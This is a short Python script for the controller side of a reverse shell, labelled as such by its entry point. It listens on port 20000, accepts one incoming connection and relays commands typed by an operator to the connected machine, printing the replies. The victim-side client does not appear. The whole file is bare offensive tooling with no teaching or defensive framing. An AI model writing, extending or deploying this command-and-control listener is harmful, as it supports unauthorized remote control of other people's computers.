import socket


def socket_create():
	try:
		global host
		global port
		global s
		host = ''
		port = 20000
		s = socket.socket()
	except socket.error as message:
		print("Creating socket error: " + str(message))


def socket_bind():
	try:
		global host
		global port
		global s
		s.bind((host, port))
		s.listen(5)
		print("Binding socket on port " + str(port))
	except socket.error as message:
		print("Binding socket error: " + str(message))
		print("Retrying...")
		socket_bind()


def socket_accept():
	connection, address = s.accept()
	print("Connection established | IP " + address[0] + ":" + str(address[1]))
	send_commands(connection)


def send_commands(connection):
	while True:
		command = input()
		if command == "quit" or command == "q":
			connection.close()
			s.close()
			raise SystemExit
		elif len(str(command)) > 0:
			connection.send(str.encode(command, "utf-8"))
			client_response = str(connection.recv(1024), "utf-8")
			print(client_response, end="")


def reverse_shell():
	socket_create()
	socket_bind()
	socket_accept()

reverse_shell()
